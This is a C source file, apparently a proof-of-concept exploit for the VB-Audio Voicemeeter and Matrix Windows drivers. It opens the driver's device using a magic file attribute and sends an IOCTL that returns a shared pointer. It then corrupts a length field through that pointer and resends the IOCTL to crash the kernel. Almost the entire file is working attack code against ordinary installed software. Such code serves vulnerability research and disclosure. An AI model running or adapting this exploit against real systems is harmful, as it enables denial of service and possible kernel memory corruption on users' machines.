#include <windows.h>
#include <winternl.h>
#include <SetupAPI.h>
#include <stdio.h>
#include <devioctl.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "SetupAPI.lib")

GUID driver_guids[] = {
    {0x3f594749, 0xd668, 0x404a, {0x84, 0xea, 0x50, 0x26, 0xb8, 0x43, 0x77, 0x52}}, // vbvoicemeetervaio64*_win10.sys
    {0x66caa746, 0x1518, 0x4c53, {0xb6, 0xe6, 0x9e, 0x55, 0x0a, 0x73, 0x4f, 0xd1}}, // vbmatrixvaio64*_win10.sys

    {0x5573cc9c, 0xdf43, 0x40bf, {0x8e, 0xb3, 0xd7, 0x9e, 0x59, 0xa5, 0xa4, 0x81}}, // vbaudio_vmauxvaio*.sys (old vaio driver)
    {0xd8c6b17a, 0x215d, 0x4082, {0x93, 0x41, 0x1e, 0x16, 0x77, 0xae, 0x6b, 0x55}}, // vbaudio_vmvaio*.sys (old vaio driver) 
    {0x7b202778, 0x4862, 0x4b61, {0x86, 0x0e, 0xfa, 0x1e, 0x65, 0x7b, 0xa3, 0xc8}}, // vbaudio_vmvaio3*.sys (old vaio driver)
};

// the driver checks this magic value to recognize CreateFile call from voicemeeter / matrix
#define MAGIC_FILE_ATTRIBUTE 0x800 // officially FILE_ATTRIBUTE_COMPRESSED

HANDLE init_device_handle();
void exploit_mapping_length(HANDLE h_device);

GUID selected_guid = {0};

int main()
{
    // request the special device handle using MAGIC_FILE_ATTRIBUTE
    HANDLE h_device = init_device_handle();

    if (h_device == INVALID_HANDLE_VALUE)
    {
        printf("init_device_handle error\n");
        return -1;
    }

    //-----------------------------------------------------------------------------------
    // send IOCTL 0x222054 (>=win10/11) or 0x222044 (<=win7) and change the length value
    //-----------------------------------------------------------------------------------
    exploit_mapping_length(h_device);
    
    return 0;
}

HANDLE init_device_handle()
{
    int num_guids = sizeof(driver_guids) / sizeof(GUID);
    HDEVINFO dev_info = INVALID_HANDLE_VALUE;

    //-------------------------------
    // try every driver in the list
    //-------------------------------

    for (int i = 0; i < num_guids; i++)
    {
        //-------------------------------
        // 1. get device path
        //-------------------------------        

        dev_info = SetupDiGetClassDevsA(&driver_guids[i], 0, 0, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);

        if (dev_info == INVALID_HANDLE_VALUE)
            continue;

        SP_DEVICE_INTERFACE_DATA di_data = {0};
        di_data.cbSize = sizeof(di_data);

        if (SetupDiEnumDeviceInterfaces(dev_info, 0, &driver_guids[i], 0, &di_data) == FALSE)
        {
            // driver not installed, try next
            SetupDiDestroyDeviceInfoList(dev_info);
            continue;
        }

        DWORD required_size;
        SetupDiGetDeviceInterfaceDetailA(dev_info, &di_data, 0, 0, &required_size, 0);

        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            printf("SetupDiGetDeviceInterfaceDetailA error\n");
            SetupDiDestroyDeviceInfoList(dev_info);
            continue;
        }

        PSP_DEVICE_INTERFACE_DETAIL_DATA_A di_detail = malloc(required_size);

        if (!di_detail)
        {
            printf("malloc error\n");
            SetupDiDestroyDeviceInfoList(dev_info);
            exit(-1);
        }

        di_detail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_A);

        if (SetupDiGetDeviceInterfaceDetailA(dev_info, &di_data, di_detail, required_size, NULL, 0) == FALSE)
        {
            printf("SetupDiGetDeviceInterfaceDetailA error\n");
            free(di_detail);
            SetupDiDestroyDeviceInfoList(dev_info);
            continue;
        }

        SetupDiDestroyDeviceInfoList(dev_info);

        //-------------------------------------------------------
        // 2. get device handle using magic file attribute value
        //-------------------------------------------------------

        HANDLE h_device = INVALID_HANDLE_VALUE;

        h_device = CreateFileA(
            di_detail->DevicePath,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            MAGIC_FILE_ATTRIBUTE,
            NULL
        );

        if (h_device == INVALID_HANDLE_VALUE)
        {
            printf("CreateFileA error\n");
            continue;
        }

        printf("open device success.\n");
        printf("driver path: %s.\n", di_detail->DevicePath);
        free(di_detail);
        selected_guid = driver_guids[i];
        return h_device;
    }

    return INVALID_HANDLE_VALUE;
}

void exploit_mapping_length(HANDLE h_device)
{
    typedef struct _output
    {
        DWORD* user_ptr;
        DWORD padding[32];
    } output_t;

    typedef struct _input
    {
        DWORD value1;
        DWORD value2;
        BYTE padding[32];
    } input_t;

    DWORD bytes_returned = 0;
    output_t output_buffer = {0};

    input_t in_buffer = { 0 };
    in_buffer.value1 = 1;
    in_buffer.value2 = 1;

    // voicemeeter & matrix, win10/11
    DWORD ioctl_code = 0x222054;

    // voicemeeter, win7
    if (memcmp(&selected_guid, &driver_guids[2], sizeof(GUID)) == 0 ||
        memcmp(&selected_guid, &driver_guids[3], sizeof(GUID)) == 0 ||
        memcmp(&selected_guid, &driver_guids[4], sizeof(GUID)) == 0)
    {
        ioctl_code = 0x222044;
    }
   
    if (!DeviceIoControl(h_device, ioctl_code, &in_buffer, sizeof(in_buffer), &output_buffer, sizeof(output_buffer), &bytes_returned, 0) || bytes_returned == 0)
    {
        printf("DeviceIoControl error\n");
        return;
    }

    printf("bytes returned: %lu\n", bytes_returned);
    printf("ptr: 0x%p\n", output_buffer.user_ptr);

    printf("corrupt 'length' value...\n");
    output_buffer.user_ptr[10] = 0xFFFFFFFF - 240;
    output_buffer.user_ptr[11] = 0;

    printf("crash in 5sec...\n");

    Sleep(5000);

    // this should crash
    if (!DeviceIoControl(h_device, ioctl_code, &in_buffer, sizeof(in_buffer), &output_buffer, sizeof(output_buffer), &bytes_returned, 0) || bytes_returned == 0)
    {
        printf("DeviceIoControl error\n");
        return;
    }

    CloseHandle(h_device);
}